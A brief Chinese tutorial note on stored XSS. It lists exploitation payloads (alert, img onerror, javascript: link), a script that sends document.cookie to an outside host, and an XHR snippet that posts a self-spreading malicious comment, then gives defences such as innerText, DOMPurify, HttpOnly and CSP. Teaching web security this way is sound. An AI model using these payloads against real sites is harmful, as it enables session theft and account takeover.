# 储存型 XSS

攻击者输入的数据会先储存在数据库里，在渲染网页的时候恶意数据里的js代码被执行。
相比于反射型 XSS，储存型 XSS 的生命周期更长，危害更大。

## 利用方式

* alert
弹窗

* 窃取 Cookie/localStorage
```html
<script>
  fetch("http://ip.com?cookie="+document.cookie)
</script>
```
`只能读取没有设置 httpOnly 的 Cookie`

* 借助图片
```html
<img src=x onerror=alert(1)>
```

* 借助伪协议
```html
<a href="javascript:alert(1)">click me</a>
```
（需要用户交互）

* 客户端请求伪造 （CSRF）
在无法读取 Cookie 时，可以使用 js 模拟用户发送请求，Cookie 会自己带上
```html
<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "/comment");
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({
    page: 3,
    content: "<img src=x onerror=alert(1)>"
  }));
</script>
```

## 参考资料

* [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## 解决方案

1. 前端在渲染从后端拿到的数据的时候，如果涉及 dom 操作，使用 `innerText` 而不是 `innerHTML`
2. 后端在储存程序前，对用户数据进行转义防止 XSS 攻击（比如 DOMPurify）
3. 对 Cookie 添加 HTTP-Only 属性，阻止 JS 访问 Cookie
4. 配置内容安全策略（CSP）
